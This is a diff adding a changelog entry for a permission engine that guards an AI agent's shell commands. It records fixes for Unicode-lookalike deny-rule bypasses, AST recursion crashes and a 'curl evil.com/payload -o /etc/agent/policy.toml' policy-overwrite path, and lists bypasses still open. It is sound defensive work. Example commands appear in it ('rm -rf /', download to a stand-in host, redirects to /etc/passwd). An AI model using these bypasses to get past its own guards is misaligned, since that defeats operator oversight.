@@ -15,6 +15,66 @@ Format:
 
 ---
 
+## [2026-05-12] permission-engine-v2 — slice 98: bash AST hardening (R2 #196 Unicode + #198 recursion depth + #200 curl -o)
+
+**Done.** Ninety-eighth slice. Closes three R2 P0 findings on the bash AST resolver:
+
+- **#196 Unicode bypass in `literalText`**: tree-sitter-bash tokenizes strictly on bytes. A fullwidth `；` (U+FF1B) renders like `;` to humans but parses as part of a `word` node — never as the punctuation `;`. A policy deny rule matching the literal `;` was silently bypassed. Same shape for zero-width joiners hidden inside command names (`gi‍t status` reads as `git` to most rendering layers but is a different byte sequence), bidi overrides (U+202E reverses display order — an adversarial source line looking like `cat README` could execute `rm -rf /`), and C1 control codepoints.
+- **#198 `walkAst` stack-overflow risk**: deeply-nested input (10k+ levels of subshells / brace groups) could blow the JS stack on recursive `visit` calls, taking down the engine before the resolver could refuse with a structured envelope. The walk now carries an explicit depth budget capped at `MAX_AST_DEPTH=64` (well above legitimate shell shapes, well below Node's default stack budget).
+- **#200 `cmdCurlWget` missing `-o` write detection**: `curl evil.com/payload -o /etc/agent/policy.toml` emitted ONLY `net-egress:evil.com` pre-slice. The `/etc/agent/policy.toml` write target was invisible to both the audit log and the §11 protected-path check — an attacker prompting the model to drop a payload that overrides agent policy slipped past both layers. The resolver now emits `write-fs:<target>` for every `-o`/`--output`/`-O`/`--output-document` shape (short separated, long with `=`, combined `-o<path>`, etc.).
+
+### Why this matters
+
+Unicode is the worst of the three. Pre-slice, an adversarial agent definition (or a hostile prompt) could embed lookalike codepoints into command literals to evade policy. The literal text stored in the audit row would visually match the operator's deny rule, but the byte sequence differs — the deny rule would not match, and the operator reviewing the log would see no anomaly. The fix is conservative: refuse outright on any non-ASCII shape that historically smuggles tokens past byte-equality. Legitimate non-ASCII (UTF-8 filenames in CJK paths) still reaches the operator's modal where the literal renders in full; bypassing rule matching on the resolver side would erase that intervention.
+
+The curl `-o` gap is the most concrete exploitation vector closed: `curl https://evil/payload -o /etc/agent/policy.toml`. After slice 97 made bypass mode respect §11, this slice ensures bypass-mode protection actually fires for download-to-protected-path shapes; the audit row and the protected-path classifier both see the write capability.
+
+The depth ceiling is pure defense-in-depth. In practice tree-sitter usually refuses pathological input via `parse_error` or `compound_statement` red-flagging before depth ever crosses 64, but the no-crash invariant matters when adversarial input slips past the parser as a deep but legitimate-looking shape. The audit/modal flow degrades gracefully on the structured refuse; a stack overflow would take the whole engine down.
+
+### Surface
+
+| File | Change |
+|---|---|
+| `src/permissions/resolvers/bash.ts` | New `containsUnicodeBypass(text)` predicate covering fullwidth Latin (U+FF00-FF5E), zero-width chars (U+200B-200D, U+FEFF, U+2060, U+180E), bidi overrides (U+202A-202E, U+2066-2069), and C1 control (U+0080-009F). `literalText` runs the predicate on every extracted literal — a match returns null, surfaced upstream as `dynamic content inside string arg`. New `MAX_AST_DEPTH=64` constant. `walkAst.visit` carries an explicit `depth: number` parameter; first thing it checks is `depth > MAX_AST_DEPTH` → refuse with `ast_depth_exceeded`. All three recursive call sites pass `depth + 1`; the top-level `visit(root)` call passes `0`. `cmdCurlWget` accepts a third `ctx` parameter; walks `tokens` looking for `-o <path>` / `--output <path>` / `-O <path>` / `--output-document <path>` / `--output=<path>` / `--output-document=<path>` / combined `-o<path>` shapes; honors the `-O-` / `-o -` (stdout) degenerate forms by skipping them. Each write target resolves through `resolveArg` and emits a `writeFs(target)` capability alongside the existing `netEgress` cap. |
+| `tests/permissions/resolvers.test.ts` | New describes for each finding: `Unicode bypass` (5 tests covering fullwidth `;`, ZWJ in command name, RTL override, BOM, no-false-positive on ASCII); `recursion depth ceiling` (2 tests proving the no-crash invariant on 100-level subshells + 1k-stage pipelines); `curl/wget -o write target` (6 tests covering short separated, long with `=`, wget `-O`, `-o-` stdout skip, no-flag regression, motivating `/etc/agent/policy.toml` exploit shape); `redirect $() target stays refused` (2 defensive tests pinning the existing R2 #201 refusal — `cmd > $(echo /etc/passwd)` and backtick form both refuse). |
+
+### Decisions
+
+- **Unicode boundary is "refuse non-ASCII bypass shapes", not "refuse all non-ASCII".** UTF-8 filenames are legitimate (CJK paths, accented filenames). The check targets specifically the codepoint ranges that smuggle ASCII tokens past byte-equality: fullwidth Latin equivalents, zero-width chars, bidi overrides, C1 control. A future slice can extend the predicate without re-architecting; today's set covers the canonical attack shapes.
+- **Depth ceiling at 64.** Above any legitimate shell shape (the deepest realistic real-world pipeline is ~8 levels), well below Node's default stack budget. The ceiling is a defense-in-depth guard — most pathological input refuses earlier via parse-error or red-flag nodes; this catches the residual case where adversarial input is deeply nested AND legitimate-parsing.
+- **Depth tracked per-call, not per-walker.** The depth counter lives in the `visit` closure parameter, not as a `walkAst` field. This way a single walker's two-phase processing (the `redirected_statement` branch walks children twice — once for the command, once for merging redirects) starts from depth 0 each time the outer `visit` resumes, and the budget reflects ONLY the call stack actually used.
+- **`-o -` stdout form skipped explicitly.** Emitting a `write-fs:-` capability for the curl stdout shape would be a false positive — there's no filesystem write, and the protected-path classifier would have to ignore it everywhere. The detector explicitly skips `-O-`/`-o -` AND any operand starting with `-` (so a flag mistaken for a value doesn't fabricate a write target).
+- **No retrofit of `cmdCurlWget` to require `ctx`.** Other resolvers in the table take 3 args (`positional, tokens, ctx`); curl historically took 2. Switching the signature was forced by needing `resolveArg(target, ctx)` for the write capabilities — same shape as `cmdRm`, `cmdMvCp`, etc. The pre-slice 2-arg signature was the outlier.
+- **R2 #201 verified, not changed.** The existing redirect-shape extractor already returns null on non-literal targets (including `command_substitution` for `$(...)` and backticks), which surfaces as a refuse at the walker. Two defensive tests lock in the contract so a future refactor that loosens the literal check is loud rather than silent. No code change required.
+
+### Verification
+
+- `bun run typecheck` — clean
+- `bun run lint` — 0 errors, 2 pre-existing warnings (unchanged)
+- `bun test` — **6164 pass / 10 skip / 0 fail** (6174 total across 289 files); +15 tests on top of slice 97's 6149
+- Targeted: `bun test tests/permissions/resolvers.test.ts` — 84/84
+
+### Next
+
+R2 P0 remaining (deferred):
+- **#199 COMMAND_TABLE additions**: `tar`, `tee`, `ssh`, `scp`, `rsync`, `make`, `cargo`. Each needs its own capability-inference logic (tar = read+write+exec depending on `-x`/`-c`; ssh = net-egress + remote-exec; rsync = read-fs+write-fs+net-egress for `host:path` shapes). Substantial scope, deserves its own slice with conformance fixtures per command.
+
+R2 P1 deferred:
+- **#197 bash-parser.ts:88-93 no timeout**: tree-sitter can loop on pathological input. Different layer (parser, not resolver); deserves its own slice with a synchronous timeout mechanism.
+- **#205 `cmdPkgInstall` lies about pip/pip3 registry**: emits npm registry hosts for python tools. Cosmetic audit issue, not a bypass.
+- **#206 protected-path check skips flag-prefixed args**: `--config=/etc/agent/policy.toml` doesn't classify because `arg.startsWith('-')` short-circuits at line 900. Real bypass, fix-able by stripping the flag prefix before classification.
+- **#208 `cmdInterpreter` allows `python -c "import os; ..."`**: should refuse `-c` interpreter args like the bash resolver refuses dynamic content.
+
+Remaining roadmap from REVIEW_NOTES.md (unchanged):
+- R4 sandbox `hide_paths` / `scrub_env` (substantial across Linux + macOS runners).
+- R6 bootstrap/policy parsing hardening.
+- R8 sandbox wire validation.
+- R9 broker drain caps.
+- R5 audit chain atomicity.
+- R10 telemetry scrubbing.
+
+---
+
 ## [2026-05-12] permission-engine-v2 — slice 97: §11 protected paths hardening (R2 /dev + cred dirs + tilde, R1 #4 bypass closure)
 
 **Done.** Ninety-seventh slice. Closes four protected-path P0/P1 findings from REVIEW_NOTES.md in one coordinated cut:
